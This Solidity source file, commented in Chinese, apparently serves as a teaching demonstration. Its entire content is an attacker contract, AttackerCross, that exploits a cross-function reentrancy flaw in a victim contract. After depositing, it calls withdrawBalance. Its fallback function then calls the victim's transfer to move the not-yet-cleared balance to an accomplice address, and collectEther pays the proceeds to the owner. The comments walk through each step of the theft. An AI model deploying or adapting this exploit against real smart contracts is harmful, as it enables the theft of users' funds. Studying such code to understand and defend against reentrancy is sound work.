pragma solidity ^0.4.24;

interface ICrossFunction {
    function transfer(address to, uint amount) external;
    function withdrawBalance() external;
    function addToBalance() external payable;
    // 假设受害者合约有存款功能（原代码没给，假设我们能通过某种方式让攻击者有余额）
    // 为了演示，我们通常需要先想办法让攻击者在合约里有钱。
    // 这里假设可以通过 fallback 存钱或者手动发钱。
}

contract AttackerCross {
    ICrossFunction public victim;
    address public owner;
    address public partner; // 同伙账户

    constructor(address _victimAddress, address _partner) public {
        victim = ICrossFunction(_victimAddress);
        owner = msg.sender;
        partner = _partner;
    }

    // 1. 攻击入口
    function attack() public payable{
        // 此时攻击者在受害者合约里应该已经有余额了（比如 1 ETH）
        // 直接调用提现
        victim.addToBalance.value(msg.value)();
        victim.withdrawBalance();
    }

    // 2. 跨函数重入核心
    function () public payable {
        // 当收到提现的 ETH 时，触发这里。
        // 此时，受害者合约还没执行 userBalances[msg.sender] = 0
        // 所以我们在账面上还有钱！
        
        // 我们利用这个间隙，调用 transfer 函数
        // 把账面上“还没扣除”的钱，转给同伙！
        if (msg.sender == address(victim)) {
             victim.transfer(partner, msg.value);
        }
    }

    function collectEther() public {
        owner.transfer(address(this).balance);
    }
}